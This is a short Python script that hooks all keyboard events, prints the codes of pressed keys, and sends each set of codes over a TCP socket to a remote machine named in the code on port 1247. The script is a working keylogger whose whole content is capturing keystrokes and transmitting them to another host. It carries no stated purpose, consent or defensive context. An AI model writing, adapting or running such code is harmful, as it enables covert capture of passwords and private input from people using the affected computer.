import socket
import sys
import keyboard

sys.path.append('..')


def print_pressed_keys(e):
    line = ', '.join(str(code) for code in keyboard._pressed_events)
    # '\r' and end='' overwrites the previous line.
    # ' '*40 prints 40 spaces at the end to ensure the previous line is cleared.
    print('\r' + line + ' ' * 40, end='')
    s.send(line.encode())


s = socket.socket()
host = 'zaherairout-X556URK'  # needs to be in quote
port = 1247
s.connect((host, port))
print(s.recv(1024))
keyboard.hook(print_pressed_keys)
keyboard.wait()
